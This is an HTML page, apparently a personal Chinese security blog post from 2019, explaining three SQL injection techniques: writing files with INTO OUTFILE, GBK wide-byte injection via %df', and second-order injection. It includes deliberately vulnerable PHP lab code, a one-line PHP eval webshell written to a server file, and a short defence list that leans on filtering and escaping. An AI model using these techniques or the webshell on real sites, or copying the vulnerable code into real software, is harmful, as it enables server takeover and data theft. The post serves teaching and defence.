@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言：&amp;emsp;&amp;emsp;这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。 参考文献：水清云影老师的讲解视频 正文：&amp;emsp;&amp;emsp;SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+<meta property="og:url" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/index.html">
+<meta property="og:site_name" content="Water Cloud">
+<meta property="og:description" content="前言：&amp;emsp;&amp;emsp;这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。 参考文献：水清云影老师的讲解视频 正文：&amp;emsp;&amp;emsp;SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/QQ.png">
+<meta property="og:updated_time" content="2019-05-14T13:19:12.028Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入漏洞之文件写入、宽字节注入及二次注入">
+<meta name="twitter:description" content="前言：&amp;emsp;&amp;emsp;这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。 参考文献：水清云影老师的讲解视频 正文：&amp;emsp;&amp;emsp;SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/">
+
+
+
+
+
+  <title>SQL注入漏洞之文件写入、宽字节注入及二次注入 | Water Cloud</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Water Cloud</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-favorite">
+          <a href="/favorite/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
+            
+            favorite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            Schedule
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Water Cloud">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Water Cloud">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入漏洞之文件写入、宽字节注入及二次注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-11T21:02:55+08:00">
+                2019-05-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>&emsp;&emsp;这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。</p>
+<p>参考文献：<a href="https://www.bilibili.com/video/av48675526/?p=7" target="_blank" rel="noopener">水清云影老师的讲解视频</a></p>
+<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>&emsp;&emsp;SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊。</p>
+<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p>&emsp;&emsp;这是利用SQL语句中<code>into outfile</code>语句进行注入的一种方式，通过漏洞点将木马写入服务器的注入方式。假设站点下存在普通的SQL注入，代码举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#sql.php</span><br><span class="line">&lt;?php</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$conn=@mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,NULL,&apos;erci2&apos;);</span><br><span class="line">$sql=&quot;SELECT * FROM USER WHERE id=&#123;$id&#125;&quot;;</span><br><span class="line">$result=mysqli_query($conn,$sql) or die(mysqli_error($conn));</span><br><span class="line">while($row=mysqli_fetch_array($result))&#123;</span><br><span class="line">  echo &quot;ID:&quot;.$row[&apos;id&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;username:&quot;.$row[&apos;username&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;password:&quot;.$row[&apos;password&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;EMAIL:&quot;.$row[&apos;PHONE&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;正常的执行结果是这样的：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/1.png" alt="p1"></p>
+<p>从源代码中就可以看出来源码存在SQL报错注入，而且是数字型报错注入；没有过滤<code>into outfile</code>关键字，这就是产生SQL注入文件写入的前提，如果这里被人写入这样的语句：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/2.png" alt="p2"></p>
+<p>&emsp;&emsp;虽然我用的是MAC，当我一直都搞不懂文件目录，不过在Windows可以直接用<code>F:/VHOST/www/con.php</code>就会在那个目录在站点目录下面生成一个php文件，根据我上面的语句，里面生成的内容就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#con.php</span><br><span class="line">2	Cayce	Atlantis	18888888888</span><br><span class="line">1	&lt;?php eval($_POST[&apos;1&apos;]);?&gt;	3	4</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里会出现一句话木马是因为上面payload里面的16进制内容就是一句话木马。</p>
+<h3 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h3><p>&emsp;&emsp;先来谈谈宽字节的来源吧：一般的网站为了人性化，都会用到字符，字符集和字符序，而程序员在网站开发上处理这些字符的用的大多都是UTF-8编码，也就是位于ASCII码和UNICODE之间的中间编码，但有一些特殊的网站还会用到ASCII编码，而宽字节就是其中几类ASCII编码的特征，比如常见的有：GB2312、GBK、GB18030、BIG5、Shift_JIS等，这些编码都是由两个字节，也就是一个字组成。而款字节注入就是利用这个特性来吃掉被转义的ASCII字符（一个字节），而不影响代码的执行。代码举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#sql.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=GBK&quot;);</span><br><span class="line">$id=addslashes($_GET[&apos;id&apos;]);</span><br><span class="line">$conn=@mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,NULL,&apos;erci2&apos;);</span><br><span class="line">$sql=&quot;select * from user where id=&apos;$id&apos;&quot;;</span><br><span class="line">mysqli_query($conn,&quot;SET NAMES &apos;GBK&apos;&quot;);</span><br><span class="line">$result=mysqli_query($conn,$sql) or die(mysqli_error($conn));</span><br><span class="line">while($row=mysqli_fetch_array($result))&#123;</span><br><span class="line">  echo &quot;ID:&quot;.$row[&apos;id&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;username:&quot;.$row[&apos;username&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;password:&quot;.$row[&apos;password&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">  echo &quot;PHONE:&quot;.$row[&apos;phone&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>先看一下正常SQL注入：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/4.png" alt="p4"></p>
+<p>再看一下宽字节注入方法：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/3.png" alt="p3"></p>
+<p>对比发现，正常闭合的单引号被转义了，而使用<code>%df&#39;</code>的方式闭合会出现一个‘運’字，这是因为原本转义单引号的<code>\</code>被吃掉了，组成一个宽字节字符。看这里的一张图<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/5.png" alt="p5"></p>
+<p>&emsp;&emsp;走一下过程：MYSQL的编码被设置成宽字节型编码，php代码中使用的转义函数对接收的数据进行处理，payload中对闭合符号之前加入吃掉%5c的%df符号，在宽字节的编码下，形成一个被SQL语言忽略的汉字，绕过成功。</p>
+<h3 id="二次注入："><a href="#二次注入：" class="headerlink" title="二次注入："></a>二次注入：</h3><p>&emsp;&emsp;二次注入是因为程序员在编写后台代码的时候虽然精心处理了用户传过来的数据，但存储在数据库之中的数据还是跟用户输入的数据的一样，而数据在取出数据库的时候，就会被当作SQL语句执行，从而造成二次注入。代码举例一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#sql.php 注册功能</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;constant-type:text/html;charset=utf-8&quot;);</span><br><span class="line">if(!empty($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">	$Username=addslashes($_POST[&apos;Username&apos;]);</span><br><span class="line">	$Password=addslashes($_POST[&apos;Password&apos;]);</span><br><span class="line">	$Phone=addslashes($_POST[&apos;Phone&apos;]);</span><br><span class="line">	$conn=@mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,NULL,&apos;erci2&apos;);</span><br><span class="line">	$sql=&quot;insert into user(username,password,phone) values(&apos;&#123;$Username&#125;&apos;,&apos;&#123;$Password&#125;&apos;,&apos;&#123;$Phone&#125;&apos;)&quot;;</span><br><span class="line">	$result=mysqli_query($conn,$sql) or die(mysqli_error());</span><br><span class="line">	if($result)&#123;</span><br><span class="line">		header(&apos;location:1.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;SQL二阶注入&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; style=&quot;margin-left: 35%;&quot; action=&quot;&quot;&gt;</span><br><span class="line">	Username:&lt;input type=&quot;text&quot; name=&quot;Username&quot;&gt;&lt;br /&gt;</span><br><span class="line">	Password :&lt;input type=&quot;password&quot; name=&quot;Password&quot;&gt;&lt;br /&gt;</span><br><span class="line">	Phone:&lt;input type=&quot;text&quot; name=&quot;Phone&quot; style=&quot;margin-left: 3.3%&quot;&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; style=&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>注册之后可以在某一位置对数据进行查询获修改，代码举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#1.php 查询功能</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;constant-type:text/html;charset=utf-8&quot;);</span><br><span class="line">if(!empty($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">	$id=$_POST[&apos;id&apos;];</span><br><span class="line">	$conn=@mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,NULL,&apos;erci2&apos;);</span><br><span class="line">	$sql=&quot;select * from user where id=&apos;&#123;$id&#125;&apos;&quot;;</span><br><span class="line">	$result=mysqli_query($conn,$sql) or die(mysqli_error());</span><br><span class="line">	while($row=mysqli_fetch_array($result))&#123;</span><br><span class="line">		$Username=$row[&apos;username&apos;];</span><br><span class="line">		$sql=&quot;select * from user where username=&apos;&#123;$Username&#125;&apos;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,$sql) or die(mysqli_error());</span><br><span class="line">		while($row=mysqli_fetch_array($result))&#123;</span><br><span class="line">			echo &quot;ID:&quot;.$row[&apos;id&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">			echo &quot;Username&quot;.$row[&apos;username&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">			echo &quot;Password&quot;.$row[&apos;password&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">			echo &quot;Phone:&quot;.$row[&apos;phone&apos;];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;SQL二阶注入&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; style=&quot;margin-left: 35%;&quot; action=&quot;&quot;&gt;</span><br><span class="line">	search id:&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; style=&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>简单解释一下代码，在sql.php中用户可以将数据插入数据库，虽然传过来的数据被过滤了，不过写入的数据库的数据却被还原成用户输入的内容，在1.php中，查询的时候调用到shellcode，原本无害的数据被当作SQL命令执行，造成SQL二阶注入。过程演示，恶意用户构造ShellCode：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/6.png" alt="p6"></p>
+<p>这里传进去的Username原本会被addslashes($_POST[‘Username’])转义，不过在存入数据库的时候会被还原：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/7.png" alt="p7"></p>
+<p>之后在另一个界面调用到这个数据的时候如果没有经过处理，该数据就会被当成SQL命令执行：<img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/8.png" alt="p8"></p>
+<p>明显可以看出来，Username部分显示的跟用户创建的值不一样，而是数据被当作命令执行后的结果，这就是一个二次注入的SQL漏洞。</p>
+<h5 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h5><p>对这三个漏洞，不管哪个，建议四步走：</p>
+<ol>
+<li>对用户输入的数据最好都用正则表达式将关键是全部都给过滤掉；</li>
+<li>再使用mysqli_real_escape_sring()处理SQL执行语句；</li>
+<li>对编码进行强制性要求，直接写死，不给机会；</li>
+<li>不使用where语句，使用mysqli自带方法将每一步写死。</li>
+</ol>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>&emsp;&emsp;现在对于这三个漏洞能想起来的也就这么多，这还是在老师的讲解视频的帮助下。这应该算是SQL注入中的高级注入方式了，目前本人还只是菜鸟一枚，对其他的SQL偏门注入了解的不是很深，就不献丑了。如果我的理解还有什么不到位的地方，欢迎表哥表姐们批评教育，请走该通道：</p>
+<p><img src="/2019/05/11/SQL注入漏洞之文件写入、宽字节注入及二次注入/QQ.png" alt="QQ"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/25/CSRF和SSRF带来的WEB漏洞/" rel="next" title="CSRF和SSRF带来的WEB漏洞">
+                <i class="fa fa-chevron-left"></i> CSRF和SSRF带来的WEB漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Water Cloud</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文："><span class="nav-number">2.</span> <span class="nav-text">正文：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件写入："><span class="nav-number">2.0.1.</span> <span class="nav-text">文件写入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#宽字节注入："><span class="nav-number">2.0.2.</span> <span class="nav-text">宽字节注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入："><span class="nav-number">2.0.3.</span> <span class="nav-text">二次注入：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#防御方式："><span class="nav-number">2.0.3.0.1.</span> <span class="nav-text">防御方式：</span></a></li></ol></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#总结："><span class="nav-number">3.</span> <span class="nav-text">总结：</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Water Cloud</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
